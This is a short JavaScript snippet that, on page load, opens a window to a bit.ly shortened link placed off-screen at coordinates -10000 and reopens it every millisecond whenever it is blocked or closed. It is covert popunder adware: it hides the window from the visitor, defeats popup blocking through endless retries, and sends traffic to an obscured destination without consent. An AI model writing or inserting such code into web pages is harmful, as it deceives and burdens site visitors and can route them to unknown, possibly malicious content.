// First function
function openFirstPopupInBackground() {
    var popup = window.open('https://bit.ly/Jamie_Leah?utm_source=sunnyleone', '_blank', 'left=-10000, top=-10000');

    function attemptOpen() {
        if (popup === null || typeof(popup) === 'undefined' || popup.closed) {
            setTimeout(function() {
                popup = window.open('https://bit.ly/Jamie_Leah?utm_source=sunnyleone', '_blank', 'left=-10000, top=-10000');
                attemptOpen(); // Retry recursively
            }, 1);
        }
    }

    attemptOpen();
}

window.addEventListener('load', openFirstPopupInBackground);
